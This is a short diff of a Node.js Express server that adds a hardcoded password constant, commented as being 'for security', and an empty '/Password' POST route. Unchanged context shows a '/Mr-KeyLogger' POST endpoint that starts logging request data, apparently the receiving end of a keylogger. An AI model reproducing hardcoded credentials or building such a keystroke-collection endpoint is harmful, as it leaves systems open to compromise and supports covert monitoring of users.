@@ -1,3 +1,7 @@
+// The password is for security
+const password = 'PASSWORD';
+
+
 const express = require('express')
 const util = require('util')
 const fs = require('fs')
@@ -26,6 +30,11 @@ app.get('/', (request, response) => {
     return
   })
 })
+
+app.post('/Password', (req, res) => {
+
+})
+
 app.post('/Mr-KeyLogger', (request, response) => {
   var log;
   if (request.body.spec) {
